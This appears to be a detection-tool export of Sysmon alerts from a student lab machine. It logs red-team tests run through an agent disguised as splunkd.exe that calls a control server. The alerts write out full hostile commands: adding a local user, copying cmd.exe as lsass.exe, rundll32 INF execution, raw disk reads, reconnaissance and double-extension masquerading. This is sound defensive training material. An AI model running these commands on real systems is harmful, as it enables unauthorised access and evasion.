"2025-12-23 14:15:40.913 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172701,"Cmdline: cmd.exe /C net user $ ATOMIC123! /add /active:yes ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2620 ¦ PGUID: E9F06A57-95FC-694A-DC02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:15:40.899","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:16:21.945 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172704,"Cmdline: cmd.exe /C copy C:\Windows\System32\cmd.exe C:\lsm.exe && C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 1012 ¦ PGUID: E9F06A57-9625-694A-DF02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:16:21.934","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:17:02.959 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172707,"Cmdline: cmd.exe /C rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 ""4c870d_T1218.011_DefaultInstall.inf"" ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4124 ¦ PGUID: E9F06A57-964E-694A-E102-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:17:02.957","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:18:25.006 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172709,"Cmdline: cmd.exe /C copy %%SystemRoot%%\System32\cmd.exe %%SystemRoot%%\Temp\lsass.exe && %%SystemRoot%%\Temp\lsass.exe /B ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3648 ¦ PGUID: E9F06A57-96A0-694A-E402-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:18:24.991","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:19:22.043 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172712,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""$buffer = New-Object byte[] 11; $handle = New-Object IO.FileStream \""\\.\C:\"", 'Open', 'Read', 'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length); $handle.Close(); Format-Hex -InputObject $buffer"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3168 ¦ PGUID: E9F06A57-96DA-694A-E602-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:19:22.037","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.437 +01:00","Script Interpreter Execution From Suspicious Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059","sysmon",172637,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4400 ¦ PGUID: E9F06A57-9428-694A-B302-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:52.428","proc_creation_win_susp_script_exec_from_env_folder.yml","77a1d7af-c266-9197-ed58-f3349b8c2823","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.684 +01:00","Script Interpreter Execution From Suspicious Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059","sysmon",172680,"Cmdline: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.xls.vbs"" ¦ Proc: C:\Windows\System32\wscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4556 ¦ PGUID: E9F06A57-9549-694A-CC02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Microsoft ® Windows Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=A90DAAA8EE522A533588B9E63C55F605,SHA256=32B34E9FE145A550782EC2AA982894D2F183F4A7068641CF98A02ACE14DD999A,IMPHASH=72B04FD87C15A84B6C876E835F21F6E1","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: wscript.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.597","proc_creation_win_susp_script_exec_from_env_folder.yml","77a1d7af-c266-9197-ed58-f3349b8c2823","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.865 +01:00","Script Interpreter Execution From Suspicious Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059","sysmon",172681,"Cmdline: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.xlsx.vbs"" ¦ Proc: C:\Windows\System32\wscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4060 ¦ PGUID: E9F06A57-9549-694A-CD02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Microsoft ® Windows Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=A90DAAA8EE522A533588B9E63C55F605,SHA256=32B34E9FE145A550782EC2AA982894D2F183F4A7068641CF98A02ACE14DD999A,IMPHASH=72B04FD87C15A84B6C876E835F21F6E1","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: wscript.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.864","proc_creation_win_susp_script_exec_from_env_folder.yml","77a1d7af-c266-9197-ed58-f3349b8c2823","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.928 +01:00","Script Interpreter Execution From Suspicious Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059","sysmon",172682,"Cmdline: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.png.vbs"" ¦ Proc: C:\Windows\System32\wscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4800 ¦ PGUID: E9F06A57-9549-694A-CE02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Microsoft ® Windows Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=A90DAAA8EE522A533588B9E63C55F605,SHA256=32B34E9FE145A550782EC2AA982894D2F183F4A7068641CF98A02ACE14DD999A,IMPHASH=72B04FD87C15A84B6C876E835F21F6E1","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: wscript.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.926","proc_creation_win_susp_script_exec_from_env_folder.yml","77a1d7af-c266-9197-ed58-f3349b8c2823","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.684 +01:00","Suspicious Script Execution From Temp Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059","sysmon",172680,"Cmdline: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.xls.vbs"" ¦ Proc: C:\Windows\System32\wscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4556 ¦ PGUID: E9F06A57-9549-694A-CC02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Microsoft ® Windows Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=A90DAAA8EE522A533588B9E63C55F605,SHA256=32B34E9FE145A550782EC2AA982894D2F183F4A7068641CF98A02ACE14DD999A,IMPHASH=72B04FD87C15A84B6C876E835F21F6E1","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: wscript.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.597","proc_creation_win_susp_script_exec_from_temp.yml","5bbe7c88-c377-bda2-9b45-91a58165367b","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.865 +01:00","Suspicious Script Execution From Temp Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059","sysmon",172681,"Cmdline: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.xlsx.vbs"" ¦ Proc: C:\Windows\System32\wscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4060 ¦ PGUID: E9F06A57-9549-694A-CD02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Microsoft ® Windows Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=A90DAAA8EE522A533588B9E63C55F605,SHA256=32B34E9FE145A550782EC2AA982894D2F183F4A7068641CF98A02ACE14DD999A,IMPHASH=72B04FD87C15A84B6C876E835F21F6E1","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: wscript.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.864","proc_creation_win_susp_script_exec_from_temp.yml","5bbe7c88-c377-bda2-9b45-91a58165367b","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.928 +01:00","Suspicious Script Execution From Temp Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059","sysmon",172682,"Cmdline: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.png.vbs"" ¦ Proc: C:\Windows\System32\wscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4800 ¦ PGUID: E9F06A57-9549-694A-CE02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Microsoft ® Windows Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=A90DAAA8EE522A533588B9E63C55F605,SHA256=32B34E9FE145A550782EC2AA982894D2F183F4A7068641CF98A02ACE14DD999A,IMPHASH=72B04FD87C15A84B6C876E835F21F6E1","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: wscript.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.926","proc_creation_win_susp_script_exec_from_temp.yml","5bbe7c88-c377-bda2-9b45-91a58165367b","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.969 +01:00","Suspicious Script Execution From Temp Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059","sysmon",172683,"Cmdline: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.doc.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && 